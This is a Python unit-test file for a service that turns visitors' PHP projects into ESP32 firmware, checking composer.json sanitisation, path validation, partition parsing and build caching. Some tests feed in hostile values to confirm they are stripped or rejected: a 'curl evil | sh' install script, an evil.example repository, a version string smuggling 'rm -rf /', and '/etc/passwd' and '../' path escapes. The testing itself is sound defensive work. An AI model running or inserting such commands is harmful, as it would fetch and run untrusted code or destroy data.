"""
php-baremetal builds (php-baremetal fork): the pure parts of the builder.
The full engine build (composer + phpbm + ESP-IDF) is exercised end to end
by hand; here: what a visitor's composer.json may and may not do, how the
sources are taken, and how the storage image lands in the engine.
"""
import asyncio
import json
import struct
import unittest

from app.services import phpbm_builder as pb


class TestNormalizeComposer(unittest.TestCase):

    def test_keeps_packages_php_runtime_and_options(self):
        n = pb.normalize_composer(json.dumps({
            'require': {'php-baremetal/ext-gpio': '^1.0', 'php-baremetal/php-mbstring': '^1.0'},
            'config': {'platform': {'php': '8.4.20'}},
            'extra': {'baremetal': {'runtime': 'event-driven', 'options': {'gpio': {'x': 1}}}},
        }))
        self.assertEqual(n['require'], {
            'php-baremetal/conductor': '^1.0',
            'php-baremetal/ext-gpio': '^1.0',
            'php-baremetal/php-mbstring': '^1.0',
        })
        self.assertEqual(n['config']['platform']['php'], '8.4.20')
        self.assertEqual(n['extra']['baremetal']['runtime'], 'event-driven')
        self.assertEqual(n['extra']['baremetal']['options'], {'gpio': {'x': 1}})

    def test_forces_registry_board_storage_and_plugins(self):
        n = pb.normalize_composer({
            'require': {'php-baremetal/ext-gpio': '^1.0'},
            'repositories': [{'type': 'vcs', 'url': 'https://evil.example/repo'}],
            'scripts': {'post-install-cmd': 'curl evil | sh'},
            'config': {'allow-plugins': {'evil/plugin': True}},
            'extra': {'baremetal': {'board': 'waveshare-esp32-s3-zero-n8r8', 'storage': 'microsd'}},
        })
        self.assertEqual(n['repositories'], [{'type': 'composer', 'url': pb.REGISTRY, 'canonical': True}])
        self.assertNotIn('scripts', n)
        self.assertEqual(n['config']['allow-plugins'], {pb.CONDUCTOR: True})
        self.assertEqual(n['extra']['baremetal']['board'], pb.SIM_BOARD)
        self.assertEqual(n['extra']['baremetal']['storage'], 'embedded')

    def test_rejects_packages_outside_the_vendor(self):
        for bad in ('monolog/monolog', 'php-baremetal/../x', 'php-baremetal/X Y'):
            with self.subTest(bad=bad), self.assertRaises(pb.PhpbmBuildError):
                pb.normalize_composer({'require': {bad: '^1.0'}})

    def test_platform_requirements_are_dropped_not_rejected(self):
        n = pb.normalize_composer({'require': {'php': '>=8.4', 'ext-json': '*'}})
        self.assertEqual(list(n['require']), [pb.CONDUCTOR])

    def test_rejects_bad_values(self):
        for bad in (
            'not json',
            {'require': {'php-baremetal/ext-gpio': '1.0; rm -rf /'}},
            {'config': {'platform': {'php': '7.4'}}},
            {'extra': {'baremetal': {'runtime': 'arduino'}}},
            {'extra': {'baremetal': {'sdk': 'rp2040@^1'}}},
        ):
            with self.subTest(bad=bad), self.assertRaises(pb.PhpbmBuildError):
                pb.normalize_composer(bad if isinstance(bad, str) else json.dumps(bad))

    def test_key_ignores_key_order(self):
        a = pb.normalize_composer({'require': {'php-baremetal/ext-gpio': '^1.0', 'php-baremetal/ext-sys': '^1.0'}})
        b = pb.normalize_composer({'require': {'php-baremetal/ext-sys': '^1.0', 'php-baremetal/ext-gpio': '^1.0'}})
        self.assertEqual(pb.deps_key(a), pb.deps_key(b))


class TestSplitProject(unittest.TestCase):

    def test_composer_and_sources(self):
        composer, sources = pb.split_project([
            {'name': 'composer.json', 'content': '{}'},
            {'name': 'index.php', 'content': '<?php echo 1;'},
            {'name': 'project-src/lib/util.php', 'content': '<?php'},
            {'name': 'composer.lock', 'content': 'ignored'},
        ])
        self.assertEqual(composer, '{}')
        self.assertEqual(sorted(sources), ['index.php', 'lib/util.php'])

    def test_path_escapes_are_refused(self):
        for bad in ('../x.php', '/etc/passwd', '.env', 'a/../../b.php'):
            with self.subTest(bad=bad), self.assertRaises(pb.PhpbmBuildError):
                pb.split_project([{'name': 'composer.json', 'content': '{}'},
                                  {'name': bad, 'content': 'x'}])

    def test_needs_composer_and_a_source(self):
        with self.assertRaises(pb.PhpbmBuildError):
            pb.split_project([{'name': 'index.php', 'content': '<?php'}])
        with self.assertRaises(pb.PhpbmBuildError):
            pb.split_project([{'name': 'composer.json', 'content': '{}'}])

    def test_size_limit(self):
        with self.assertRaises(pb.PhpbmBuildError):
            pb.split_project([{'name': 'composer.json', 'content': '{}'},
                              {'name': 'big.php', 'content': 'x' * (pb.MAX_SOURCE_BYTES + 1)}])


def _entry(label, ptype, subtype, offset, size):
    return struct.pack(pb._PART_FMT, pb._PART_MAGIC, ptype, subtype, offset, size,
                       label.encode().ljust(16, b'\0'), 0)


class TestFlashLayout(unittest.TestCase):

    def test_partition_lookup(self):
        table = (_entry('nvs', 1, 2, 0x9000, 0x6000) + _entry('factory', 0, 0, 0x10000, 0x3C0000)
                 + _entry('storage', 1, 0x81, 0x3D0000, 0x20000) + b'\xff' * 32)
        self.assertEqual(pb.partition(table, 'storage'), (0x3D0000, 0x20000))
        with self.assertRaises(pb.PhpbmBuildError):
            pb.partition(table, 'spiffs')

    def test_overlay_replaces_in_place_and_pads(self):
        self.assertEqual(pb.overlay(b'\x00' * 8, 2, b'\x01\x02'), b'\x00\x00\x01\x02\x00\x00\x00\x00')
        self.assertEqual(pb.overlay(b'\x00' * 2, 4, b'\x01'), b'\x00\x00\xff\xff\x01')


class TestJobs(unittest.IsolatedAsyncioTestCase):

    async def test_done_and_error_states(self):
        class FakeBuilder:
            async def build(self, files, log):
                log.append('built')
                if files[0]['name'] == 'bad':
                    raise pb.PhpbmBuildError('nope')
                return {'binary_content': 'AAAA', 'engine_key': 'k', 'engine_cached': True}

        reg = pb.JobRegistry(FakeBuilder())
        ok, bad = reg.start([{'name': 'good'}]), reg.start([{'name': 'bad'}])
        await asyncio.sleep(0)
        await asyncio.sleep(0)
        self.assertEqual(reg.get(ok.id).status, 'done')
        self.assertEqual(reg.get(ok.id).result['binary_content'], 'AAAA')
        self.assertEqual(reg.get(bad.id).status, 'error')
        self.assertEqual(reg.get(bad.id).error, 'nope')
        self.assertIsNone(reg.get('missing'))


if __name__ == '__main__':
    unittest.main()


class TestEngineCache(unittest.IsolatedAsyncioTestCase):
    """One engine build per package set, even though phpbm writes phpbm.lock
    only DURING the first build (regression: the key computed before the
    build differed from the one after, so every new set built twice)."""

    async def test_second_project_with_the_same_packages_reuses_the_engine(self):
        import os
        import sys
        import tempfile
        from pathlib import Path
        from unittest.mock import AsyncMock, patch

        with tempfile.TemporaryDirectory() as tmp:
            tools = Path(tmp) / 'tools'
            tools.mkdir()
            builds = Path(tmp) / 'builds.txt'
            (tools / 'composer.py').write_text(
                "from pathlib import Path\nPath('composer.lock').write_text('{\"content-hash\":\"abc\"}')\n")
            table = (_entry('nvs', 1, 2, 0x9000, 0x6000)
                     + _entry('storage', 1, 0x81, 0x40, 0x10) + b'\xff' * 32)
            (tools / 'phpbm.py').write_text(
                "import sys\nfrom pathlib import Path\n"
                f"open({str(builds)!r}, 'a').write('x')\n"
                "Path('phpbm.lock').write_text('{\"sdk\":\"esp32@2.0.0\"}')\n"
                "b = Path('.phpbm/build'); (b / 'idf/partition_table').mkdir(parents=True, exist_ok=True)\n"
                f"(b / 'idf/partition_table/partition-table.bin').write_bytes({table!r})\n"
                "(b / 'sdkconfig').write_text('CONFIG_FATFS_LFN_HEAP=y\\n')\n"
                "(b / 'merged.bin').write_bytes(b'\\xee' * 0x50)\n")
            env = {'COMPOSER_CMD': f'{sys.executable} {tools / "composer.py"}',
                   'PHPBM_CMD': f'{sys.executable} {tools / "phpbm.py"}'}
            with patch.dict(os.environ, env):
                b = pb.PhpbmBuilder(Path(tmp) / 'cache')
                b.storage = AsyncMock(return_value=b'\x01' * 0x10)
                files = lambda src: [{'name': 'composer.json', 'content': '{"require":{"php-baremetal/ext-gpio":"^1.0"}}'},
                                     {'name': 'index.php', 'content': src}]
                r1 = await b.build(files('<?php echo 1;'), [])
                r2 = await b.build(files('<?php echo 2;'), [])
            self.assertFalse(r1['engine_cached'])
            self.assertTrue(r2['engine_cached'])
            self.assertEqual(r1['engine_key'], r2['engine_key'])
            self.assertEqual(builds.read_text(), 'x')  # phpbm ran once
